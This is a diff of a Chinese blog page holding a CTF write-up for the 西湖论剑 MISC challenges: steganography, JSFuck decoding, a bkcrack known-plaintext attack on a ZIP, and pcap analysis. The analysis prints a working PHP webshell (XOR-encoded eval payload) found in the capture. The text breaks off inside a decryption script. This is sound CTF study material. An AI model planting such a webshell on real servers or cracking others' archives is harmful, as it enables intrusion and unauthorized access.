@@ -1,109 +1,322 @@
-
 <!DOCTYPE html>
-<html lang="en" class="loading">
+<html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>西湖论剑MISC - Charmersix</title>
-    <meta name="apple-mobile-web-app-capable" content="yes" />
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="google" content="notranslate" />
-    <meta name="keywords" content="Fechin,"> 
-    <meta name="description" content="MP3拖进winhex, 发现结尾是一张png, foremost分出来试一下
-1foremost /home/kali/Desktop/cipher.mp3
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Charmersix">
+    
+    <title>
+        
+            西湖论剑MISC |
+        
+        Charmersix&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
 
-得到一张这样很像打了码的二维码, 但,"> 
-    <meta name="author" content="John Doe"> 
-    <link rel="alternative" href="atom.xml" title="Charmersix" type="application/atom+xml"> 
-    <link rel="icon" href="/img/favicon.png"> 
-    
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-
-    
-    
-    <meta name="twitter:card" content="summary"/>
-    <meta name="twitter:title" content="西湖论剑MISC - Charmersix"/>
-    <meta name="twitter:description" content="MP3拖进winhex, 发现结尾是一张png, foremost分出来试一下
-1foremost /home/kali/Desktop/cipher.mp3
-
-得到一张这样很像打了码的二维码, 但,"/>
-    
-    
-    
-    
-    <meta property="og:site_name" content="Charmersix"/>
-    <meta property="og:type" content="object"/>
-    <meta property="og:title" content="西湖论剑MISC - Charmersix"/>
-    <meta property="og:description" content="MP3拖进winhex, 发现结尾是一张png, foremost分出来试一下
-1foremost /home/kali/Desktop/cipher.mp3
-
-得到一张这样很像打了码的二维码, 但,"/>
-    
-<link rel="stylesheet" href="/css/diaspora.css">
-
+    <link rel="shortcut icon" href="/images/head.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"charmersix.icu","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.png","favicon":"/images/head.png","avatar":"/images/ta.jpg","font_size":null,"font_family":null,"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":true},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"waline","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":"https://lsvf4zhg.api.lncldglobal.com","reaction":true,"version":2}},"post":{"author_label":{"enable":false,"auto":false,"custom_label_list":["CTFer"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":false},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
+  </script>
 <meta name="generator" content="Hexo 5.4.2"></head>
 
-<body class="loading">
-    <span id="config-title" style="display:none">Charmersix</span>
-    <div id="loader"></div>
-    <div id="single">
-    <div id="top" style="display: block;">
-    <div class="bar" style="width: 0;"></div>
-    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://charmersix.icu"></a>
-    <div title="播放/暂停" class="iconfont icon-play"></div>
-    <h3 class="subtitle">西湖论剑MISC</h3>
-    <div class="social">
-        <div>
-            <div class="share">
-                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
-            </div>
-            <div id="qr"></div>
-        </div>
-    </div>
-    <div class="scrollbar"></div>
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
 </div>
 
-    <div class="section">
-        <div class="article">
-    <div class='main'>
-        <h1 class="title">西湖论剑MISC</h1>
-        <div class="stuff">
-            <span>二月 28, 2023</span>
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
             
-  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/reaction/" rel="tag">reaction</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Charmersix&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/link"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/link">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
 
 
         </div>
-        <div class="content markdown">
-            <h3 id="MP3"><a href="#MP3" class="headerlink" title="MP3"></a>MP3</h3><p>拖进winhex, 发现结尾是一张png, foremost分出来试一下</p>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">西湖论剑MISC</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/ta.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Charmersix</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-02-28 00:00:00</span>
+        <span class="mobile">2023-02-28 00:00</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-04-09 16:42:53</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Misc/">Misc</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/reaction/">reaction</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Wp/">Wp</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.2k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>9 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h3 id="MP3"><a href="#MP3" class="headerlink" title="MP3"></a>MP3</h3><p>拖进winhex, 发现结尾是一张png, foremost分出来试一下</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost /home/kali/Desktop/cipher.mp3</span><br></pre></td></tr></table></figure>
 
-<p>得到一张这样很像打了码的二维码, 但又不是二维码的图片<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251633712.png" alt="flag"></p>
+<p>得到一张这样很像打了码的二维码, 但又不是二维码的图片<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251633712.png"
+                      alt="flag"
+                ></p>
 <p>这里我们没有思路, 再放进<code>zsteg</code>里跑一下</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg flag.png --all</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251638599.png" alt="image-20230225163842502"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251638599.png"
+                      alt="image-20230225163842502"
+                ></p>
 <p>发现zip一个, 将其提取出来</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg -e <span class="string">&#x27;b1,r,lsb,xy&#x27;</span> flag.png &gt; flag.zip</span><br></pre></td></tr></table></figure>
 
 <p>有密码, 放到爆破里看一下, 看来是没戏, 剩下的思路就是MP3里应该还隐写了东西, <code>MP3Stego</code>跑一下</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251645417.png" alt="image-20230225164505241"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251645417.png"
+                      alt="image-20230225164505241"
+                ></p>
 <p>解压拿到<code>47.txt</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj</span><br></pre></td></tr></table></figure>
 
 <p>唯一提示: <code>47</code>, 去百度寻找答案</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251648281.png" alt="image-20230225164851242"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251648281.png"
+                      alt="image-20230225164851242"
+                ></p>
 <p>那就试试<code>rot47</code></p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251652515.png" alt="image-20230225165214450"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251652515.png"
+                      alt="image-20230225165214450"
+                ></p>
 <p>得到一段内容</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=~[];a=&#123;<span class="attr">___</span>:++a,<span class="attr">aaaa</span>:(![]+<span class="string">&quot;&quot;</span>)[a],<span class="attr">__a</span>:++a,<span class="attr">a_a_</span>:(![]+<span class="string">&quot;&quot;</span>)[a],<span class="attr">_a_</span>:++a,<span class="attr">a_aa</span>:(&#123;&#125;+<span class="string">&quot;&quot;</span>)[a],<span class="attr">aa_a</span>:(a[a]+<span class="string">&quot;&quot;</span>)[a],<span class="attr">_aa</span>:++a,<span class="attr">aaa_</span>:(!<span class="string">&quot;&quot;</span>+<span class="string">&quot;&quot;</span>)[a],<span class="attr">a__</span>:++a,<span class="attr">a_a</span>:++a,<span class="attr">aa__</span>:(&#123;&#125;+<span class="string">&quot;&quot;</span>)[a],<span class="attr">aa_</span>:++a,<span class="attr">aaa</span>:++a,<span class="attr">a___</span>:++a,<span class="attr">a__a</span>:++a&#125;;a.<span class="property">a_</span>=(a.<span class="property">a_</span>=a+<span class="string">&quot;&quot;</span>)[a.<span class="property">a_a</span>]+(a.<span class="property">_a</span>=a.<span class="property">a_</span>[a.<span class="property">__a</span>])+(a.<span class="property">aa</span>=(a.<span class="property">a</span>+<span class="string">&quot;&quot;</span>)[a.<span class="property">__a</span>])+((!a)+<span class="string">&quot;&quot;</span>)[a.<span class="property">_aa</span>]+(a.<span class="property">__</span>=a.<span class="property">a_</span>[a.<span class="property">aa_</span>])+(a.<span class="property">a</span>=(!<span class="string">&quot;&quot;</span>+<span class="string">&quot;&quot;</span>)[a.<span class="property">__a</span>])+(a.<span class="property">_</span>=(!<span class="string">&quot;&quot;</span>+<span class="string">&quot;&quot;</span>)[a.<span class="property">_a_</span>])+a.<span class="property">a_</span>[a.<span class="property">a_a</span>]+a.<span class="property">__</span>+a.<span class="property">_a</span>+a.<span class="property">a</span>;a.<span class="property">aa</span>=a.<span class="property">a</span>+(!<span class="string">&quot;&quot;</span>+<span class="string">&quot;&quot;</span>)[a.<span class="property">_aa</span>]+a.<span class="property">__</span>+a.<span class="property">_</span>+a.<span class="property">a</span>+a.<span class="property">aa</span>;a.<span class="property">a</span>=(a.<span class="property">___</span>)[a.<span class="property">a_</span>][a.<span class="property">a_</span>];a.<span class="title function_">a</span>(a.<span class="title function_">a</span>(a.<span class="property">aa</span>+<span class="string">&quot;\&quot;&quot;</span>+a.<span class="property">a_a_</span>+(![]+<span class="string">&quot;&quot;</span>)[a.<span class="property">_a_</span>]+a.<span class="property">aaa_</span>+<span class="string">&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">aa_</span>+a.<span class="property">_a_</span>+a.<span class="property">__</span>+<span class="string">&quot;(\\\&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">___</span>+a.<span class="property">a__</span>+<span class="string">&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">___</span>+a.<span class="property">__a</span>+<span class="string">&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">_a_</span>+a.<span class="property">_aa</span>+<span class="string">&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">___</span>+a.<span class="property">_aa</span>+<span class="string">&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">_a_</span>+a.<span class="property">a__</span>+<span class="string">&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">___</span>+a.<span class="property">aa_</span>+<span class="string">&quot;&#123;&quot;</span>+a.<span class="property">aaaa</span>+a.<span class="property">a___</span>+a.<span class="property">___</span>+a.<span class="property">a__a</span>+a.<span class="property">aaa</span>+a.<span class="property">_a_</span>+a.<span class="property">a_a</span>+a.<span class="property">aaa</span>+a.<span class="property">aa_a</span>+a.<span class="property">aa_</span>+a.<span class="property">a__a</span>+a.<span class="property">a__a</span>+a.<span class="property">aa_a</span>+a.<span class="property">aaa</span>+a.<span class="property">aaaa</span>+a.<span class="property">aa_a</span>+a.<span class="property">a_aa</span>+a.<span class="property">a_a_</span>+a.<span class="property">aaa</span>+a.<span class="property">aaa_</span>+a.<span class="property">a__a</span>+a.<span class="property">aaa</span>+a.<span class="property">a_a_</span>+a.<span class="property">__a</span>+a.<span class="property">a_a</span>+a.<span class="property">aa__</span>+a.<span class="property">a__</span>+a.<span class="property">aaaa</span>+a.<span class="property">a__a</span>+a.<span class="property">a__</span>+a.<span class="property">a_aa</span>+a.<span class="property">a__</span>+<span class="string">&quot;&#125;\\\&quot;\\&quot;</span>+a.<span class="property">a__</span>+a.<span class="property">___</span>+<span class="string">&quot;);&quot;</span>+<span class="string">&quot;\&quot;&quot;</span>)())();</span><br></pre></td></tr></table></figure>
 
 <p>像是js内容, 直接浏览器运行一下, 拿到flag:<code>DASCTF&#123;f8097257d699d7fdba7e97a15c4f94b4&#125;</code></p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251656303.png" alt="image-20230225165635280"></p>
-<p>当然, 这里我了解到他是jsfuck, 工具<a target="_blank" rel="noopener" href="https://www.bugku.com/tools/jsfuck/">在这</a></p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251657234.png" alt="image-20230225165732183"></p>
-<p>可以看一下<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e7246218f424">这里</a></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251656303.png"
+                      alt="image-20230225165635280"
+                ></p>
+<p>当然, 这里我了解到他是jsfuck, 工具<a class="link"   target="_blank" rel="noopener" href="https://www.bugku.com/tools/jsfuck/" >在这<i class="fas fa-external-link-alt"></i></a></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302251657234.png"
+                      alt="image-20230225165732183"
+                ></p>
+<p>可以看一下<a class="link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/e7246218f424" >这里<i class="fas fa-external-link-alt"></i></a></p>
 <h3 id="take-the-zip-easy"><a href="#take-the-zip-easy" class="headerlink" title="take_the_zip_easy"></a>take_the_zip_easy</h3><p>这里利用一个明文攻击, 所谓明文攻击就是通过目前已知的部分信息, 去攻击得到未知的一些信息, 那么这个压缩包我们有什么已知的呢?</p>
 <p>我们看一下这个压缩包的压缩方式</p>
 <blockquote>
@@ -117,16 +330,41 @@
 <p>ZipCrypto算是传统的zip加密方式。只有使用ZipCrypto Deflate /Store才可以使用 ZIP已知明文攻击进行破解。</p>
 <p>传统的ZIP已知明文攻击利用，windows下可以使用AZPR，linux下可以使用pkcrack。</p>
 </blockquote>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302261428532.png" alt="image-20230226142826399"></p>
-<p>那么这个压缩包有什么是我们已知的呢, 我们来winhex细看一下<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302261431346.png" alt="image-20230226143112141"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302261428532.png"
+                      alt="image-20230226142826399"
+                ></p>
+<p>那么这个压缩包有什么是我们已知的呢, 我们来winhex细看一下<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302261431346.png"
+                      alt="image-20230226143112141"
+                ></p>
 <p>很明显这个名字是我们已知的, 并且, 那我们把这名字的十六进制数值copy出来<code>646173666C6F772E706361706E67</code>, 然后通过命令<code> .\bkcrack.exe -C .\zipeasy.zip -c dasflow.zip -x 30 646173666c6f772e706361706e67 -x 0 504B0304</code></p>
 <p>拿到k</p>
 <p><code>2b7d78f3 0ebcabad a069728c</code></p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302261509371.png" alt="image-20230226150928286"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302261509371.png"
+                      alt="image-20230226150928286"
+                ></p>
 <p>然后再通过命令<code> ./bkcrack -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip</code>拿到流量包</p>
 <p>导出HTTP对象, 发现<code>flag.zip</code></p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302261527478.png" alt="image-20230226152714444"></p>
-<p>发现还是有密码的, 我们继续翻阅流量包, 这里很明显是黑客上传的webshell, 然后我们追踪最后一条<code>eval.php</code>看一下, 可惜被加密过, 那么我们往前翻, 看一下他的加密方式<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302261533545.png" alt="image-20230226153339488"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302261527478.png"
+                      alt="image-20230226152714444"
+                ></p>
+<p>发现还是有密码的, 我们继续翻阅流量包, 这里很明显是黑客上传的webshell, 然后我们追踪最后一条<code>eval.php</code>看一下, 可惜被加密过, 那么我们往前翻, 看一下他的加密方式<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302261533545.png"
+                      alt="image-20230226153339488"
+                ></p>
 <p>我们可以在第六个TCP流里发现这串加密代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;air123&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;d8ea7326e6ec5916&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -152,149 +390,446 @@
 <p>解密脚本</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>, <span class="variable">$K</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span> + <span class="number">1</span> &amp; <span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>] ^ <span class="variable">$c</span>;</span><br><span class="line">    